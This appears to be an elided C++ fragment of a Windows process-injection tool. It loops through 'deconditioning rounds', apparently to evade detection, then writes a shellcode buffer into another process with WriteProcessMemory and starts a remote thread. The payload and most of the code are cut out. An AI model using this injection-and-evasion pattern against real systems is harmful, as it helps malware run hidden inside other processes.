...
int main(int argc, char** argv) {
    ...
    for (int n = 0; n < repetitions; n++) {
        ...
        std::cout << "Starting deconditioning round " << n << "\n";
    ...
    if (WriteProcessMemory(hProcess, remote_addr, &shellcode, sizeof(shellcode), &bytes_written)) {
        std::cout << "Written payload to memory " << (void*)remote_addr << "\n";
    }
    else {
        std::cout << "Failed to write memory: " << GetLastError() << "\n";
    }
    ...
    if (hThread) {
        std::cout << "After creating remote thread";
    }
    else {
